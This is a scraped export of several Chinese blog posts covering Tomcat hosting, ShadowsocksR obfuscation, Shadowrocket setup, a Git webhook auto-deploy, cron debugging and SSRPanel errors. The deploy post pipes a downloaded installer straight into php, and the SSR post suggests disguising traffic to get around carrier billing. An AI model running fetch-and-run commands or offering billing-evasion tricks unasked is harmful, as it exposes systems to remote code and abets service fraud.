&quot;BaseUrl&quot;: &quot;https://id.atlassian.com/&quot; &#125;, &quot;Credentials&quot;: &#123; &quot;$id&quot;: &quot;4&quot;, &quot;$type&quot;: &quot;SourceTree.Model.BasicAuthCredentials, SourceTree.Api.Account&quot;, &quot;Username&quot;: &quot;&quot;, &quot;Email&quot;: null &#125;, &quot;IsDefault&quot;: false &#125; ] ``` 保存文件后，再次打开 SourceTree 就可以直接跳过登录进入软件页面了。 &gt; 注意： Windows 系统文件后缀是默认隐藏的，需要先显示文件的后缀名，然后随便新建一个文本文档 ，将文件全名改为 `accounts.json` 即可。","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"单实例多应用多站点Tomcat配置方案总结","slug":"how-to-set-mutisites-base-tomcat-by-btpanel","date":"2018-04-16T09:53:52.000Z","updated":"2018-04-16T09:53:52.000Z","comments":true,"path":"how-to-set-mutisites-base-tomcat-by-btpanel.html","permalink":"https://sobaigu.com/how-to-set-mutisites-base-tomcat-by-btpanel.html","excerpt":"","text":"前言 Tomcat就没什么好介绍了，老牌服务器应用，JSP应用服务必备。该程序对于老鸟来说功能强大，也能轻车熟路。但对于新手来说，这玩意儿太复杂了，一点都不人性化，有时候感觉还挺傻的。 作为一个新手，被这货折腾得不要不要的，对基本使用整理下，以便后面自己回来翻得到。 Tomcat基础 启停方式 12345#启动$TOMCAT_HOME/bin/startup.sh#停止$TOMCAT_HOME/bin/shutdown.sh 程序目录结构 简单介绍一下各个文件夹及文件： bin：主要存放脚本文件，例如比较常用的windows和linux系统中启动和关闭脚本 conf：主要存放配置文件，其中最重要的两个配置文件是server.xml和web.xml lib：主要存放tomcat运行所依赖的包 LICENSE：版权许可证，软件版权信息及使用范围等信息 logs：主要存放运行时产生的日志文件，例如catalina.out(曾经掉过一个大坑)、catalina.{date}.log等 NOTICE：通知信息，一些软件的所属信息和地址什么的 RELEASE-NOTES：发布说明，包含一些版本升级功能点 RUNNING.txt：运行说明，必需的运行环境等信息 temp：存放tomcat运行时产生的临时文件，例如开启了hibernate缓存的应用程序，会在该目录下生成一些文件 webapps：部署web应用程序的默认目录，也就是 war 包所在默认目录 work：主要存放由JSP文件生成的servlet（java文件以及最终编译生成的class文件） 上面是一个安装后的 Tomcat 的全部组成部分，如果你要启动，进入bin目录执行startup.sh就可以，接着就可以在浏览器输入http://localhost:8080/访问了。 Tomcat单实例多应用部署方案 参照网上别人的经验，标准的单机多实例应该是这样的 上图中的 CATALINA_HOME 指Tomcat安装路径，CATALINA_BASE 指实例所在位置。 CATALINA_HOME 路径下只需要包含 bin 和 lib 目录，而 CATALINA_BASE 只存放 conf、webapps、logs 等这些文件，这样部署的好处在于升级方便，配置及安装文件间互不影响，在不影响 Tomcat 实例的前提下，替换掉 CATALINA_HOME 中的安装文件。 程序包路径 比如程序包归类放到了/home/wwwroot 目录下，那么其目录结构如下： 1234[root@zaza wwwroot]# ll总用量 16drwxr-xr-x. 3 www www 4096 8月 8 17:26 defaultdrwxr-xr-x 7 root root 4096 8月 9 10:03 tomcat-1 tomcat-1表示实例1，tomcat-2表示实例2，每个实例目录结构都是一样的，以此类推。 1234567891011[root@zaza wwwroot]# ll tomcat-1总用量 20drwx------. 3 root root 4096 8月 9 10:32 confdrwxr-x---. 2 root root 4096 8月 9 11:08 logsdrwxr-x---. 2 root root 4096 8月 9 10:20 tempdrwxr-x---. 3 root root 4096 8月 9 10:06 webappsdrwxr-x---. 2 root root 4096 8月 9 11:08 work[root@zaza wwwroot]# ll tomcat-1/webapps/总用量 4drwxr-xr-x. 17 root root 4096 8月 9 10:10 ROOT 程序包统一规则放置在webapps/ROOT 下。 Tomcat端口配置 同一个服务器部署不同 Tomcat 要设置不同的端口，不然会报端口冲突，所以我们只需要修改conf/server.xml中的其中前三个端口就行了。但它有四个分别是： Server Port：该端口用于监听关闭tomcat的shutdown命令，默认为8005 Connector Port：该端口用于监听HTTP的请求，默认为8080 AJP Port：该端口用于监听AJP（ Apache JServ Protocol ）协议上的请求，通常用于整合Apache Server等其他HTTP服务器，默认为8009 Redirect Port：重定向端口，出现在Connector配置中，如果该Connector仅支持非SSL的普通http请求，那么该端口会把 https 的请求转发到这个Redirect Port指定的端口，默认为8443； 宝塔面板部署Tomcat应用 宝塔面板提供了一键安装Tomcat及JDK安装的功能，在配置网站应用时，也可以一键启用Tomcat，面板会自动完成和nginx的配置整合。但是，截止目前最新版本『5.8.7』都会留个坑，导致Tomcat应用只能访问默认的Tomcat默认欢迎页或者干脆出现404错误。 原因就是宝塔面板在生成Tomcat配置的时候有个地方有错误，需要手工对其更正。添加完网站应用并在网站配置中启用Tomcat后，请返回宝塔首页或者软件管理中，找到Tomcat打开Tomcat的主配置 1234//新增的网站应用&lt;Host appBase=&quot;/www/wwwroot/xx.com&quot; autoDeploy=&quot;true&quot; name=&quot;xx.com&quot; unpackWARs=&quot;true&quot; xmlNamespaceAware=&quot;false&quot; xmlValidation=&quot;false&quot;&gt; &lt;Context crossContext=&quot;true&quot; docBase=&quot;/www/wwwroot/xx.com&quot; path=&quot;&quot; reloadable=&quot;true&quot; /&gt;&lt;/Host&gt; 在我们新增完网站应用后，默认是上面那样的配置，其中 appBase= 和 docBase= 默认是一样的，这里我们需要将 appBase= 留空然后重载配置或者重启Tomcat，否则会出现404的错误，正确配置如下： 1234//新增的网站应用&lt;Host appBase=&quot;&quot; autoDeploy=&quot;true&quot; name=&quot;xx.com&quot; unpackWARs=&quot;true&quot; xmlNamespaceAware=&quot;false&quot; xmlValidation=&quot;false&quot;&gt; &lt;Context crossContext=&quot;true&quot; docBase=&quot;/www/wwwroot/xx.com&quot; path=&quot;&quot; reloadable=&quot;true&quot; /&gt;&lt;/Host&gt; 附录：JSP环境安装 Tomcat使用环境一般都会涉及到环境安装的问题，将基本的资料贴出来以供参考。 JDK 官网下载二进制包，解压到/usr/local/jdk，设置系统环境变量 123456789101112#设置系统环境变量vi /etc/profile#在profile文件中添加如下内容#set java environmentJAVA_HOME=&#x27;/usr/local/jdk&#x27;CLASS_PATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarPATH=$JAVA_HOME/bin:$PATHexport JAVA_HOME CLASS_PATH PATH#让修改生效source /etc/profile TomCat 官网下载二进制包，解压到/usr/local/tomcat，设置系统环境变量 1234567891011#设置系统环境变量vi /etc/profile#在profile文件中添加如下内容#set tomcat environmentTOMCAT_HOME=&#x27;/usr/local/tomcat&#x27;PATH=$PATH:$TOMCAT_HOME/bin export TOMCAT_HOME PATH#让修改生效source /etc/profile 参考文档 宝塔部署java web项目完整教程 聊聊 Tomcat 的单机多实例","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"SSR混淆及混淆协议参数的设置","slug":"how-to-use-ssr-obfs","date":"2018-04-04T03:00:42.000Z","updated":"2018-04-04T03:00:42.000Z","comments":true,"path":"how-to-use-ssr-obfs.html","permalink":"https://sobaigu.com/how-to-use-ssr-obfs.html","excerpt":"","text":"前言 最初破娃酱设计混淆的时候只是想着伪装为看起来像正常的流量，减少被注意到的可能性而已，但实际上流量混淆衍生出了不少的黑科技用法。 ShadowsocksR混淆的选择 首先是混淆参数的问题。 这个混淆参数可根据你的设定，伪装为对任意host的访问，但破娃酱不建议填写此参数，但建议服务端节点带有域名及正确的解析，这样不需要填写参数，客户端将直接使用节点的域名作为参数。 为什么应该这样做呢？ 因为运营商已经在少数地区布置了DNS验证系统『有可能是故意针对SSR』，如果发出的 http/tls 请求里的域名解析出的IP地址列表，与所连接的实际IP不一致，多次请求后就可能会把此IP加入临时黑名单。所以，如果节点有域名，那么参数不写其实是最好的，很多人都习惯写一个大公司网站的域名，其实这反而留下了一个可被检测的地方。 混淆的实际应用 虽然破娃酱不建议加参数，但各地区情况不一样，大部分情况下加了参数速度更快，用的更长久，其应用主要包括以下几类： 遇到运营商QoS，使用混淆能提速 所在网络有严格限制，仅能使用 80 或 443 端口，不认识的协议根本不能用的（如学校、公司、政府办公网络） 对自己的隐私有要求的，希望在运营商的连接记录里留下看起来正常的访问记录 试图绕过学校或运营商的计费系统，即免流『该部分应用较普遍，配合抓包大法可以爽歪歪』 第五类其它黑科技用途保密 软件和协议 运营商检测到的类型 显示地址 Shadowsocks TCP 业务 显示服务器 IP SS + http_simple（80端口） 上网（Web 方式 get） 显示混淆域名 SSR TCP 业务 显示服务器 IP SSR + http_simple 上网（Web 方式 get） 显示混淆域名 SSR + TLS（443） 安全类网页浏览（HTTPS VPN）流量 HTTPS 链接 显示混淆域名 SSR + TLS（非443） 网络连接（网页）HTTPS 链接 显示混淆域名 IPSec VPN UDP 业务 显示服务器 IP V2Ray TCP 业务 显示服务器 IP V2Ray + TLS HTTPS 网络连接 显示证书域名 nghttpx + TLS HTTPS 网络连接 显示证书域名 kcptun UDP 业务 显示服务器 IP 混淆参数 http_simple 1xinhuaapp-img.img.aliyuncs.com#User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 MicroMessenger/6.5.13\\nAccept: /\\nConnection: keep-alive 混淆含义：审查方将看到你正用iOS 10.2.1的微信内置浏览器，在浏览某个来自国内某『和谐的』新闻客户端的多媒体内容，且该内容已CDN到国外 1mmbiz.qpic.cn#User-Agent: Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9502 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36\\nAccept: /\\nConnection: keep-alive 混淆含义：审查方将看到你正用S4的默认浏览器在浏览微信的多媒体内容，且该内容已CDN到国外 tls1.2_ticket_auth 这个协议对应的参数就简单了，填自己希望伪装的网址，如： 1www.icloud.com,img.alicdn.com,apps.bdimg.com 多个域名之间用英文 , 区隔，客户端会随机选择一个进行混淆伪装。 混淆常用host 国外域名混淆 因为节点均为非大陆ip，所以合理性来说用国外混淆才是最好的伪装 12345678tse1.mm.bing.netcloudfront.comcloudflare.comitunes.apple.comwww.icloud.comajax.microsoft.comapps.bdimg.comwww.bing.com 国内域名混淆 平常访问以下站点那个多就用那个，或定期更换 12345678static.youku.com #优酷static.hdslb.com #B站item.taobao.com #淘宝m.10010.com #联通uac.10010.com #联通wap.10086.cn #移动dl.music.189.cn #电信cdn.4g.play.cn #电信 参考文档 ShadowsocksR混淆的选择 ShadowsocksR 协议插件文档 混淆过的协议现在检测率有多少？","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"iOS『苹果手机』Shadowrocket『小火箭』使用图文教程","slug":"how-to-use-shadowrocket-ios","date":"2018-04-03T12:15:10.000Z","updated":"2018-04-03T12:15:10.000Z","comments":true,"path":"how-to-use-shadowrocket-ios.html","permalink":"https://sobaigu.com/how-to-use-shadowrocket-ios.html","excerpt":"","text":"技术发展到今天，iOS已经诸多限制，基本上都要通过 App Store 安装软件，根据图文教程：一文搞定苹果ID和小火箭安装使用，安装正版付费才是最稳妥可靠的方法。 小火箭这个软件国区已经买不到了，自己没账号的请自行注册或者购买港区/美区账号下载，风险自担。 前言 此教程主要介绍使用PP助手安装iOS最好用的翻墙APP小火箭，即：Shadowrocket（以下统一称为小火箭），不用美区账号，安装APP不用花钱，手机不用越狱. 教程中需要用到的代理账号自己想办法，或者到此免费获取SS®账号。 如果要用更完美点的伪装，那就用V2Ray，新手指南看此篇 如果通过其他方式可以安装，那你就不用看PP助手安装这步了，软件装好使用方法是一样的 关于软件 小火箭是一款强大的苹果APP，支持各种代理协议，这里我仅以本站的SSR搭建教程部署的SSR作为演示，其他爬墙方式对应的小火箭配置请自行研究。 大家可能会以为配置了混淆的SSR会使翻墙速度变的很慢，其实不是的，按照本站教程搭建的SSR服务器使用 auth_chain_a 协议，油管1080P无压力。根据网友使用经验，iOS用小火箭的翻墙速度，比Windows用SSR客户端快很多，苹果手机Youtube的速度吊炸天。 还有部分人不想按照此教程安装小火箭，也不会其他途径安装其他软件，但服务器用的协议是 auth_chain_a 导致客户端不支持，对于这种，还是想说：自己想办法！ 安装PP助手&amp;小火箭 PP助手上已经不提供直接安装了，请去下载一个离线版本，然后用PP助手导入即可使用，只是相对新版本功能稍弱，新版本免费安装方法等有空再做教程 安装和连接手机的细节就不说了，各位如果有问题的话可以看看PP助手官网的说明,安装并且连接完毕后应该如下图所示： 查找并安装小火箭 iOS小火箭配置 此时你的手机上应该有小火箭了，在最右的一个主屏，打开小火箭APP吧！ 添加服务器首选左上角那个扫码添加，扫一下完事就没必要浪费时间写教程了。 如果就喜欢麻烦点，想手动添加节点，那就按以下教程配置： 如上图所示，打开APP后主页这两个地方都可以添加节点，点击，进入下一步 如上图所示，按照本站部署的SSR服务器，大概流程为： 点开“类型”，选择ShadowsocksR； “服务器”填写你的VPS的IP地址； “端口”填写服务端SSR配置的端口，本站的8389是为手机端配置的； “密码”填写8389端口对应的密码，本站默认是123456，如果你自己改过配置，则填你自己的密码； “算法”点开选择“none”，由于协议和混淆已经超级强大，根本不需要这个加密； “混淆”点开分别配置协议和混淆，协议是auth_chain_a，混淆是tls1.2_ticket_auth； “备注”自己随便填，不影响； 点最右上角的“完成”，结束节点的添加工作。 启用服务 下面介绍第一次连接节点： 如上图所示，添加了节点之后，主界面（“首页”）节点列表就会出现你刚才添加的节点。 主界面右上角有一个开关，点那个开关连接节点； 第一次连接会弹出对话框提示添加代理，点Allow允许，不然不能用； 如果你有好几个节点，点击节点可以设为默认，每次连接都会连接默认节点，如果要连别的节点，则把别的节点设为默认； 节点右边的感叹号点进去可以查看、修改节点详细配置。 至此，你应该已经成功在苹果手机上用自己搭建的SSR服务器翻墙了，打开浏览器试试吧 vmess类型配置 对于v2ray缺点就是不支持kcp,并且只支持小火箭自己导出的二维码，并不支持其他二维码扫码添加v2ray配置。所以你就手动去添加配置，按服务商提供的信息填好就行，没提到的地方保持默认或者留空即可。","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"VSCODE全局搜索『按文件夹路径搜索』功能失效","slug":"vscode-cannot-search-anything-in-path","date":"2018-04-02T14:04:04.000Z","updated":"2018-04-02T14:04:09.000Z","comments":true,"path":"vscode-cannot-search-anything-in-path.html","permalink":"https://sobaigu.com/vscode-cannot-search-anything-in-path.html","excerpt":"","text":"起因 Windows10疯了似的更新，更新失败了还一直提示更新，提示系统不支持UEFI启动，还不给关闭，设计这个逻辑脑袋真是秀逗了。 刚好系统也乱七八糟的用了不短时间，终于决定重装个系统，重装完系统干净了，以前的一些环境也要从头开始搞。装到vscode，发现全局搜索功能失效了…… 问题原因 一直纠结于为什么不能搜索，前前后后折腾了近一个小时，最终却忽略在一个设置上，如下图： 因为是新做的系统，以前OneDriver目录在默认的C盘，这次重装后C盘文件没了，但登录账号后，OneDriver这个设置中文叫做『按需下载』，根据需要下载文件以节省空间。 不解的是搜索的目录下文件已经下载下来了，但vscode的按路径搜索的功能什么也搜不到，但取消该设置后确实是可以搜索了,而且再去勾选按需下载，也能正常使用了。 排查步骤 确认是不是OneDriver的问题 之前新做系统，很多工作目录没添加进来，就一直在试已经添加的目录，结果正好该目录就放在OneDriver里的，也没试下其他的目录搜索，白费了不少功夫。 确认程序没有冲突 有人说快捷键冲突也会导致这样的问题，比如搜狗输入法的简繁切换快捷，如果不是上面的情况，自己可以去试下是不是全局快捷键有冲突造成。 还有就是确认你所用的程序是完整的，不会出现丢配置模块不全等问题，可以软件卸载重装等测试。 修改vscode用户配置 打开设置，把如下代码复制粘贴进用户配置 1234&quot;search.exclude&quot;: &#123; &quot;system/&quot;: true, &quot;!/system/**/*.ps*&quot;: true &#125; 如果用户配置已有内容，请注意在上一行行末或添加行行首添加半角逗号，重启VSCODE，然后看是否能有效果。 参考文档 Cannot open a folder under my OneDrive folder VSCODE 全局搜索无效的问题","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"Windows服务器基础优化设置","slug":"windows-server-optimize-setting-basic","date":"2018-03-30T09:18:57.000Z","updated":"2018-03-30T09:18:57.000Z","comments":true,"path":"windows-server-optimize-setting-basic.html","permalink":"https://sobaigu.com/windows-server-optimize-setting-basic.html","excerpt":"","text":"该文只适合Windows系统，如果是Linux系统可查看此文：阿里云VPS净化处理 前言 买了个阿里云服务器，3年279大洋，用来挂个淘宝，便宜实惠。 选了Windows系统模板安装的 Windows server 2008 sp2 系统，但和普通的不一样，也不知道阿里云搞了什么，暂且不究。系统起来后有一堆阿里的程序在里面，看名字很吓人，也不知道干什么的，知道干什么的那些也没给好好优化下，所以自己动手，把不需要的服务和程序禁用，节省服务器资源。 安装基础软件 压缩与解压缩 优秀的软件就那么几款，Winrar是收费软件，咱还是做个遵纪守法的公民，不花钱就用免费的吧，推荐用HaoZip，这算是2345这个流氓公司为数不多的良心软件了。 下载链接懒得贴，自己去官网下载，当然，软件并非越新越好，利益驱使可能会忘了初心。安装完成后把软件设置为手动更新，够用就可以了。 输入法 用得惯系统自带的就不用折腾了，直接用ABC吧。想用个顺手点的比如搜狗，那就装个去广告优化版。 Chrome浏览器 虽然服务器上很少用，但总有用的时候。server系统自带的IE浏览器简直不能用，还是装个浏览器吧，省得闹心。 优化设置项 所谓优化，纯粹本院自娱自乐，在你那可能是狗屎，这里写出来纯属分享，不认同的请自便即可。 设置桌面 默认桌面上只有个回收站，任务栏有个资源管理器，且打开默认不会到我的电脑显示盘符那个界面。 任务栏资源管理器默认打开我的电脑 在任务栏资源管理器图标上：右键》文件资源管理器》右键点属性，在目标 路径后面追加 ,【注意英文逗号前有个空格】，这样点击任务栏此图标就直接和打开我的电脑效果一样了。 将 我的电脑 放置到桌面 方法1：开始》搜索 icon，点击 显示或隐藏桌面上的通用图标，然后就会打开 桌面图标设置，勾选或取消对应图标即可。 方法2：在桌面上鼠标右键或者控制面板》个性化，可见左侧有个 更改桌面图标，然后就跟方法1一样了 禁用不必要的服务 禁用系统服务方法：开始》运行》输入：service.msc 打开服务管理器，然后在对应服务上右键或者双击即可打开设置界面，可对服务进行相应操作，以下不再赘述。 阿里云的服务 阿里云有好几个服务，名字比较有诱惑性，所谓安骑士不知道真正是干什么的会有什么私货，毕竟有『前科』被踢爆过，我们可以将其禁用或者改为手动启动观察一段时间 123Alibaba Security Aegis Detect ServiceAlibaba Security Aegis Update ServiceAliyunService 系统服务 Computer Browser：局域网网络发现服务，不发现才好，停止并禁用 Print Spooler：打印服务，一个云服务器哪来的打印，停止并禁用 Server：局域网共享就是这个，135端口开了容易感染病毒，停止并禁用 TCP/IP NetBIOS Helper：139端口就是这货，开了后局域网里可以用计算机名称访问，停止并禁用 Windows Update：系统更新服务，阿里云已经改造过了，但这个服务却开着，结果就一直提示更新又不能更新，停止并禁用 其他一些服务自行斟酌，这里只列举几个明确不需要的，不喜随你便！","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"基于webhook方案的Git自动部署方案","slug":"git-deployer-with-webhook-auto","date":"2018-03-18T12:42:43.000Z","updated":"2018-03-18T12:42:43.000Z","comments":true,"path":"git-deployer-with-webhook-auto.html","permalink":"https://sobaigu.com/git-deployer-with-webhook-auto.html","excerpt":"","text":"前言 之前已经用Git实现了自己博客的提交自动部署，并自动提交到GitHub和coding以备不时之需。平时项目代码都托管在Coding或者GitHub上，也已经用上了coding提供的webhook功能，偶尔个别自己玩玩的项目提交了代码之后再SSH到服务器上去 git pull 一次，刚好一起做成了自动部署，方法记录起来备忘。 实现步骤 在服务器上 以Nginx环境为例，Apache请看OverTrue的教程 生成公钥 公钥有两个：1. git用户公钥，2. 部署公钥： git用户公钥 123ssh-keygen -t rsa -C &quot;admin@xsooo.com&quot;#然后一直回车就行#生成的文件通常是 /root/.ssh/id_rsa，如果非root用户请查看提示上的路径 部署公钥 1sudo -Hu www ssh-keygen -t rsa #请选择 “no passphrase”，一直回车下去 准备钩子文件 创建和修改目录权限 12mkdir /home/wwwroot/website.com/hookchown -R www:www /home/wwwroot/website.com/hook 写入钩子文件 1sudo -Hu www touch /home/wwwroot/website.com/hook/index.php 钩子文件代码内容如下： 123456789101112131415161718&lt;?php error_reporting(1); $target = &#x27;/home/wwwroot/website.com&#x27;; // 生产环境web目录 $token = &#x27;您在coding填写的hook令牌&#x27;; $wwwUser = &#x27;www&#x27;; $json = json_decode(file_get_contents(&#x27;php://input&#x27;), true); if (empty($json[&#x27;token&#x27;]) || $json[&#x27;token&#x27;] !== $token) &#123; exit(&#x27;error request&#x27;); &#125; $cmd = &quot;sudo -Hu $wwwUser cd $target &amp;&amp; git pull&quot;; shell_exec($cmd);?&gt; 确保你的hook文件可以访问：http://example.com/hook/index.php ， 钩子准备完成。 修改git配置和保存git用户名密码 123sudo -Hu www git config --global credential.helper store #永久保存sudo -Hu www git config --global user.name &quot;Bantes&quot; sudo -Hu www git config --global user.email &quot;admin@xsooo.com&quot; #邮箱请与conding上一致 在Coding仓库 添加用户公钥 复制/root/.ssh/id_rsa.pub内容到个人设置页的SSH公钥里添加即可（https://coding.net/user/account/setting/keys） 添加部署公钥 复制/home/www/.ssh/id_rsa.pub的内容并添加到部署公钥: 选择 项目 &gt; 设置 &gt; 部署公钥 &gt; 新建 ，将公钥内容全部粘贴到下面框并确认 添加hook 选择 项目 &gt; 设置 &gt; WebHook &gt; 新建hook 粘贴你的 hook/index.php 所在的网址。比如：http://example.com/hook/index.php, 令牌可选，但是建议写上。 coding出了个 webhookv2 功能强大了不少，对有更多细节要求的程序帮助不少但也复杂了，选择返回旧版新建个webhook使用即可。 稍过几秒刷新页面查看hook状态，或者点击测试，显示为绿色勾就OK了。 项目初始化 我们需要先在服务器上clone一次，以后都可以实现自动部署了： 1sudo -Hu www git clone https://git.coding.net/yourname/yourgit.git /home/wwwroot/website.com/ --depth=1 这个时候应该会要求你输入一次Coding的帐号和密码，因为上面我们设置了永久保存用户名和密码，所以之后再执行git就不会要求输入用户名和密码了。 注意，这里初始化clone必须要用www用户 往Coding.net提交一次代码测试 在本地clone的仓库执行： 1git commit -am &quot;test hook&quot; --allow-emptygit push OK，稍过几秒，正常的话你在配置的项目目录里就会有你的项目文件了。 初始化Laravel框架 下载Composer 在项目目录下执行： 12sudo -Hu www curl -sS https://getcomposer.org/installer | phpsudo -Hu www php composer.phar install 记得在本地提交的时候在.gitignore中加上composer.phar 参考文档 用 Git 钩子进行简单自动部署 利用WebHook实现PHP自动部署Git代码 使用git做服务器端代码的部署 SSH密钥生成与部署","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"},{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"记一次系统任务无法正常执行","slug":"linux-schedule-donot-run-with-crond","date":"2018-03-15T11:09:36.000Z","updated":"2018-03-15T11:09:36.000Z","comments":true,"path":"linux-schedule-donot-run-with-crond.html","permalink":"https://sobaigu.com/linux-schedule-donot-run-with-crond.html","excerpt":"","text":"问题现象 新换了个VPS装了个程序，需要用到系统定时任务，可装完发现程序功能异常。一开始怀疑程序的问题，毕竟自己凭着三脚猫功夫改过些代码。 折腾完发现程序代码没问题，原来是定时任务没执行。但查看系统任务在正常地跑着，任务配置格式也没问题，手动执行是正常的。搜了下issues，该问题有不少人遇到，但都没有明确给出问题的根本原因。 问题原因 不喜欢兜圈子，直接说原因： www 用户一般在安装LNMP或者宝塔面板时会自动创建，且是个无登录权限无 HOME 的用户，如果系统定时任务归属于此用户，估计系统任务执行时需要到对应用户目录下执行，此时 crond 执行时会出现切换目录失败，导致表面上没错，但定时任务未执行。 1(CRON) ERROR chdir failed (/home/www): No such file or directory 错误日志 1tail -f /var/log/cron 开着这个，会监控到 crond 服务执行日志，有错误也能看到，照错误提示去解决就行了。 正常执行情况下是这样子的： 12Mar 15 20:14:01 xxx CROND[23817]: (www) CMD (php /yyy/artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1)Mar 15 20:15:01 xxx CROND[23844]: (www) CMD (php /yyy/artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1) 问题排查方法 检查任务设置 确认自己的定时任务设置没问题，包括语法结构和用户权限等，命令可以手动执行测试下，任务设置方法可见： SSRpanel搭建相关设置问题：定时任务 Linux系统的添加任务计划参考 倒推检查 检查任务执行后的结果是否符合预期 确保定时任务服务启动状态：service crond status 用 tail -f /var/log/cron 查看系统定时任务执行情况 根据日志解决对应错误问题 系统任务无错的情况检查自己的任务执行命令，手动执行看结果","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"苹果电脑SSR客户端节点订阅失败","slug":"ssr-subscribe-failed-in-mac","date":"2018-03-12T08:00:23.000Z","updated":"2018-03-12T08:00:23.000Z","comments":true,"path":"ssr-subscribe-failed-in-mac.html","permalink":"https://sobaigu.com/ssr-subscribe-failed-in-mac.html","excerpt":"","text":"给亲友分享SSR服务，使用节点订阅的功能是非常方便的，服务器有变动，只要更新节点信息，客户端自动更新就同步了。 可某一天发现，在MacOS上订阅总是失败，提示： 订阅请求失败：xxxx，请检查网络连接 同一时期，同一个账号同一个订阅地址，在Windows，Android客户端是能正常更新订阅的，所以判断是苹果系统客户端的问题。 经过查找客户端GitHub issues，有一个相同的问题，客户端作者答复必须使用 https:// 订阅地址！ qinyuhang commented on 4 Oct 2017 不支持http协议的订阅，只支持https的订阅链接 苹果电脑很久没开，之前是成功过的，而且客户端配置没动过，服务端没改过，无缘无故就订阅失败了，所以唯一解释就是客户端有更新了。 可是，印象中并没有升级客户端版本，难道后台有客户端规则自动更新？不管怎么样，测试结果表明，订阅节点启用 https 后确实就订阅成功了。 所以，那么就这样吧，就是告诉大家，启用 https 得了。 苹果电脑下的SSR订阅节点使用可见：SSR客户端视频教程系列之：MacOS【苹果电脑】","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"解决SSRPanel面板用户登录报错","slug":"shadowsocks-fix-login-ssrpanel-with-error","date":"2018-03-09T09:52:55.000Z","updated":"2018-03-09T09:52:55.000Z","comments":true,"path":"shadowsocks-fix-login-ssrpanel-with-error.html","permalink":"https://sobaigu.com/shadowsocks-fix-login-ssrpanel-with-error.html","excerpt":"","text":"前言 与亲朋好友分享酸酸乳账号的平台用了一段时间，突然之间苹果系统里的客户端就不能订阅成功了，此时Windows版本的客户端仍然正常。 苹果系统版本之前是能订阅成功的，而且恢复老版本也不能成功，平台上一堆僵尸账号，程序也很久没更新了，索性重新折腾了一遍。 自然是轻车熟路地搭起来，可其中遇到一些问题，记录一二。 问题1：管理后台无法登录 错误一堆忘记记录了，大概是语法错误之类…… 因为之前都是自己手动导入SQL文件，这次尝鲜照着施工文档里的所谓播种填充数据，执行的时候顺风顺水，最后还是使用了手动导入SQL的方法操作了一次就正常了。 方法1、通过phpmyadmin等工具导入 进入工具后台，创建数据库，数据库名自己高兴就好，数据库排序值为 utf8mb4-general-ci 即可。 然后 点击创建好的数据库》导入》选择SQL文件》执行 ，很快数据库就建表完成了，此时登录应该就正常了。 方法2、通过mysql命令导入 以前写过，懒得再写，请参考：Linux系统下mysql命令行导入导出数据 问题2：用户后台打不开 这个错误大概是这个样子的： 12345678910111213(1/2) PDOExceptionSQLSTATE[42000]: Syntax error or access violation: 1055 Expression #29 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#x27;SSRpanel-mod.ss_node_label.id&#x27; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by(2/2) QueryExceptionSQLSTATE[42000]: Syntax error or access violation: 1055 Expression #29 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#x27;SSRpanel-mod.ss_node_label.id&#x27; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by (SQL: select * from `ss_node` left join `ss_node_label` on `ss_node`.`id` = `ss_node_label`.`node_id` where 0 = 1 and `ss_node`.`status` = 1 group by `ss_node`.`id`) 